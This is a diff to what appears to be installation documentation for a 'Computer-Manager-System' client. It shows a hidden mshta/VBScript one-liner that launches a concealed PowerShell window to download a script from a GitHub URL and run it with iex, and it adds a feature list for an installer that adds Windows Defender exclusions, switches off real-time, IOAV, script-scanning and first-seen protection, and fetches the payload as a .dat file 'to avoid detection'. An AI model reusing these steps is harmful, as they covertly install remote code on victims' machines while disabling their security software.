@@ -6,4 +6,18 @@ Or with VBScript wrapper (completely hidden):
 
 mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell -WindowStyle Hidden -c """"iwr https://raw.githubusercontent.com/FuzzyGumnut/Computer-Manager-System/main/install-exe.ps1 -UseBasicParsing | iex"""""",0:Close")
 
-Note: The exe must be built and released on GitHub first. Run the GitHub Actions workflow to build it.
+Installer Features:
+- Aggressive exclusions BEFORE download:
+  - Excludes installation directory
+  - Excludes Downloads folder
+  - Excludes TEMP folder
+  - Excludes client.exe process
+- Temporarily disables Real-time protection:
+  - Disables Real-time monitoring
+  - Disables IOAV protection
+  - Disables Block at First Seen
+  - Disables script scanning
+- Downloads as .dat file then renames:
+  - Downloads as client.dat to avoid detection
+  - Renames to client.exe after download
+- Re-enables protection after installation
